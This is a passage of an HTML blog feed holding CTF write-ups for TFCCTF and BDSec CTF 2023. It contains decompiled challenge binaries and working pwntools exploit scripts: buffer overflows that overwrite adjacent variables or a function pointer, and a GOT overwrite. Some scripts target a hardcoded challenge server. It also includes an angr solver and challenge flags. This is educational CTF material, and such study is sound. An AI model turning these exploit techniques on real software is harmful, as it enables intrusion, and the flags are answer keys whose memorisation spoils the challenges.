class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>,(<span class="type">char</span> *)<span class="number">0x0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  local_68 = (undefined  [<span class="number">16</span>])<span class="number">0x0</span>;</span><br><span class="line">  local_58 = (undefined  [<span class="number">16</span>])<span class="number">0x0</span>;</span><br><span class="line">  local_48 = (undefined  [<span class="number">16</span>])<span class="number">0x0</span>;</span><br><span class="line">  local_38 = (undefined  [<span class="number">16</span>])<span class="number">0x0</span>;</span><br><span class="line">  local_28 = (undefined  [<span class="number">16</span>])<span class="number">0x0</span>;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">          <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">            menu();</span><br><span class="line">            __isoc99_scanf(&amp;DAT_0040204f,&amp;local_6c);</span><br><span class="line">            <span class="keyword">if</span> (local_6c != <span class="number">3</span>) <span class="keyword">break</span>;</span><br><span class="line">            view(local_68);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="number">3</span> &lt; local_6c);</span><br><span class="line">        <span class="keyword">if</span> (local_6c != <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line">        local_c = get_index();</span><br><span class="line">        <span class="keyword">if</span> ((local_c != <span class="number">-1</span>) &amp;&amp; (*(<span class="type">long</span> *)(local_68 + (<span class="type">long</span>)local_c * <span class="number">8</span>) != <span class="number">0</span>)) &#123;</span><br><span class="line">          edit(*(undefined8 *)(local_68 + (<span class="type">long</span>)local_c * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="number">2</span> &lt; local_6c);</span><br><span class="line">    <span class="keyword">if</span> (local_6c == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ((local_6c == <span class="number">1</span>) &amp;&amp; (local_10 = get_index(), local_10 != <span class="number">-1</span>)) &#123;</span><br><span class="line">      uVar1 = add();</span><br><span class="line">      *(undefined8 *)(local_68 + (<span class="type">long</span>)local_10 * <span class="number">8</span>) = uVar1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>work flow of main function :</p><ul><li>allows us to add , edit , view and exit using their corresponding numbers</li><li>takes index and content to add and edit the particular memory section</li></ul><p>did manage to overwrite got entry of <code>exit</code> with <code>win</code> function as partial relero is set</p><h4 id="Exploit-4"><a href="#Exploit-4" class="headerlink" title="Exploit"></a>Exploit</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./notes&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.binary = elf</span><br><span class="line"></span><br><span class="line">gdbscript =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">break</span> *<span class="number">0x0000000000401439</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">def conn(argv=[], *a, **kw):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  # Set GDBscript below</span><br><span class="line">        <span class="keyword">return</span> gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    elif args.REMOTE:  # (<span class="string">&#x27;server&#x27;</span>, <span class="string">&#x27;port&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  # Run locally</span><br><span class="line">        <span class="keyword">return</span> process([elf.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">r = conn()</span><br><span class="line">def add(index):</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.sendline(b<span class="string">&quot;AA&quot;</span>)</span><br><span class="line"></span><br><span class="line">def edit(index, content):</span><br><span class="line">    r.recv()</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line">    pause()</span><br><span class="line">    edit(<span class="number">0</span>, b<span class="string">&quot;A&quot;</span>*<span class="number">0x20</span> + p64(elf.got[<span class="string">&quot;exit&quot;</span>]))</span><br><span class="line">    pause() </span><br><span class="line">    edit(<span class="number">1</span>, p64(elf.sym.win))</span><br><span class="line">    pause()  </span><br><span class="line">    r.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><h3 id="pass"><a href="#pass" class="headerlink" title="pass"></a>pass</h3><h5 id="main-func-4"><a href="#main-func-4" class="headerlink" title="main func"></a>main func</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> extraout_AL;</span><br><span class="line">  <span class="type">char</span> *pcVar1;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  uint counter;</span><br><span class="line">  <span class="type">char</span> user_input [<span class="number">40</span>];</span><br><span class="line">  undefined8 local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(undefined8 *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  set_flag();</span><br><span class="line">  fgets(user_input,<span class="number">27</span>,<span class="built_in">stdin</span>);</span><br><span class="line">  pcVar1 = user_input;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Password entered: %s\n&quot;</span>);</span><br><span class="line">  counter = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    encrypt((<span class="type">char</span> *)(ulong)(uint)(<span class="type">int</span>)user_input[counter],(<span class="type">int</span>)pcVar1);</span><br><span class="line">    <span class="keyword">if</span> (extraout_AL != flag[(ulong)counter * <span class="number">26</span>]) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Wrong password&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    counter = increment();</span><br><span class="line">  &#125; <span class="keyword">while</span> (counter != <span class="number">25</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Correct password&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">import re </span><br><span class="line"></span><br><span class="line">project = angr.Project(<span class="string">&quot;./pass&quot;</span>, auto_load_libs=False)</span><br><span class="line"></span><br><span class="line">@project.hook(<span class="number">0x4019b3</span>)  # Target address</span><br><span class="line">def print_flag(state):</span><br><span class="line">    print(<span class="string">&quot;VALID INPUT:&quot;</span>, state.posix.dumps(<span class="number">0</span>))</span><br><span class="line">    project.terminate_execution()</span><br><span class="line"></span><br><span class="line">project.execute()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h3><h3 id="down-bad"><a href="#down-bad" class="headerlink" title="down bad"></a>down bad</h3><h4 id="Solve-1"><a href="#Solve-1" class="headerlink" title="Solve"></a>Solve</h4><p><a href="https://fotoforensics.com/">https://fotoforensics.com/</a></p><h3 id="Cry"><a href="#Cry" class="headerlink" title="Cry"></a>Cry</h3><h3 id="mayday"><a href="#mayday" class="headerlink" title="mayday"></a>mayday</h3><p>description</p><blockquote><p>We are sinking! The nearest ship got our SOS call, but they replied in pure gobbledygook! Are ye savvy enough to decode the message, or will we be sleepin’ with the fish tonight All hands on deck!</p><p>Whiskey Hotel Four Tango Dash Alpha Romeo Three Dash Yankee Oscar Uniform Dash Sierra One November Kilo India November Golf Dash Four Bravo Zero Uniform Seven</p><p>Flag format: TFCCTF{RESUL7-H3R3}</p></blockquote><p><img src="/imgs/post6/cry/cry1.png" alt="cry1.png"></p><p>Flag : TFCCTF{WH4T-AR3-YOU-S1NKING-4B0U7}</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
            <tag> reversing </tag>
            
            <tag> misc </tag>
            
            <tag> forensic </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF WriteUp: BDSec 2023</title>
      <link href="/2023/07/22/post5/bdsecCTF_2023/"/>
      <url>/2023/07/22/post5/bdsecCTF_2023/</url>
      
        <content type="html"><![CDATA[<p><img src="/imgs/post5/front.png" alt="front"></p><p>Over the weekend, I took part in BDSEC CTF 2023, a CTF event designed for beginners. It was a fun and approachable competition where I managed to solve various challenges.  </p><p>All challenges can be found <a href="https://github.com/Durge5h/CTFs/tree/main/Competition/BDSecCTF-2023">here</a></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>All pwn challenge was typical and easy </p><h3 id="Ghost"><a href="#Ghost" class="headerlink" title="Ghost"></a>Ghost</h3><h4 id="main-func"><a href="#main-func" class="headerlink" title="main func"></a>main func</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">long</span> in_FS_OFFSET;</span><br><span class="line">  <span class="type">char</span> vuln_buff [<span class="number">64</span>];</span><br><span class="line">  <span class="type">int</span> target;</span><br><span class="line">  <span class="type">char</span> buff [<span class="number">264</span>];</span><br><span class="line">  <span class="type">long</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>);</span><br><span class="line">  printCatArt();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ghostly Haunting: Mysterious Apparitions Spotted in Abandoned Mansion!&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  target = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;ghost code: &quot;</span>);</span><br><span class="line">  gets(buff);</span><br><span class="line">  <span class="built_in">strcpy</span>(vuln_buff,buff);</span><br><span class="line">  <span class="keyword">if</span> (target == <span class="number">0x44434241</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;BDSEC&#123;you_need_to_find_flag_in_server!&#125;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You have escaped the ghost!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_10 != *(<span class="type">long</span> *)(in_FS_OFFSET + <span class="number">0x28</span>)) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    __stack_chk_fail();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>vulnerable <code>gets</code> function being used that take the user input without checking bound </li><li>then <code>strcpy</code> function copy <strong>buff</strong> var’s data to <strong>vuln_buff</strong> (basically we control the vuln_buff)</li><li>then  <strong>target</strong> var is being checked with <strong>0x44434241</strong> </li><li>if its equal to that pre defined value print the flag or exit the program</li></ul><p>as <strong>target</strong> variable is adjacent to vuln_buff we can overwrite it.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&quot;./ghost&quot;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">continue </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([elf.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#r = conn()</span></span><br><span class="line">    r = remote(<span class="string">&#x27;139.144.184.150&#x27;</span>,<span class="number">4000</span>)</span><br><span class="line">    matchMe = <span class="number">0x44434241</span></span><br><span class="line">    payload = cyclic(<span class="number">64</span>) + p64(matchMe) </span><br><span class="line">    r.sendline(payload) </span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/imgs/post5/pwn/ghost.png" alt="Ghost.png"></p><h3 id="anyaForger"><a href="#anyaForger" class="headerlink" title="anyaForger"></a>anyaForger</h3><h4 id="vuln-func"><a href="#vuln-func" class="headerlink" title="vuln func"></a>vuln func</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> local_30 [<span class="number">32</span>];</span><br><span class="line">  <span class="type">int</span> local_10;</span><br><span class="line">  </span><br><span class="line">  local_10 = <span class="number">0x12345678</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the secret word: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  gets(local_30);</span><br><span class="line">  <span class="keyword">if</span> (local_10 == <span class="number">-0x21524111</span>) &#123;</span><br><span class="line">    anyaforger();</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Sorry, that\&#x27;s not the secret word.&quot;</span>);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>same as previous one </p><h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&quot;./beef&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">continue </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([elf.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#r = conn()</span></span><br><span class="line">    r = remote(<span class="string">&#x27;139.144.184.150&#x27;</span>,<span class="number">31337</span>)</span><br><span class="line">    negative_value = -<span class="number">0x21524111</span></span><br><span class="line">    <span class="comment">#decimal_value = int(str(negative_value), 0)</span></span><br><span class="line"></span><br><span class="line">    payload = cyclic(<span class="number">32</span>) + pack(negative_value) </span><br><span class="line">    r.sendline(payload) </span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/imgs/post5/pwn/anyaForger.png" alt="anyaForger.png"></p><h3 id="callme"><a href="#callme" class="headerlink" title="callme"></a>callme</h3><h4 id="main-func-1"><a href="#main-func-1" class="headerlink" title="main func"></a>main func</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined local_54 [<span class="number">64</span>];</span><br><span class="line">  code *local_14;</span><br><span class="line">  undefined *puStack16;</span><br><span class="line">  </span><br><span class="line">  puStack16 = &amp;stack0x00000004;</span><br><span class="line">  local_14 = (code *)<span class="number">0x0</span>;</span><br><span class="line">  printDogArt();</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;who let the dogs out:&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(&amp;DAT_08048a94,local_54);</span><br><span class="line">  <span class="keyword">if</span> (local_14 == (code *)<span class="number">0x0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I tell the fellas start the name calling!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Well, the party was nice, the party was  @ %p\n&quot;</span>,local_14);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    (*local_14)();</span><br><span class="line">  &#125;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>hmm same as prev but this instead of any particular value we have to call the <code>callme</code> function </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./callme&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span class="line"></span><br><span class="line">gdbscript=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">conn</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:  <span class="comment"># Set GDBscript below</span></span><br><span class="line">        <span class="keyword">return</span> gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:  <span class="comment"># (&#x27;server&#x27;, &#x27;port&#x27;)</span></span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># Run locally</span></span><br><span class="line">        <span class="keyword">return</span> process([elf.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#r = conn()</span></span><br><span class="line">    r = remote(<span class="string">&#x27;139.144.184.150&#x27;</span>,<span class="number">3333</span>)</span><br><span class="line">    payload = cyclic(<span class="number">64</span>)+ pack(<span class="number">0x0804875e</span>) </span><br><span class="line">    r.sendline(payload)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><img src="/imgs/post5/pwn/callme.png" alt="callme.png"></p><h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><h3 id="Lucky-Number"><a href="#Lucky-Number" class="headerlink" title="Lucky Number"></a>Lucky Number</h3><h4 id="main-func-2"><a href="#main-func-2" class="headerlink" title="main func"></a>main func</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 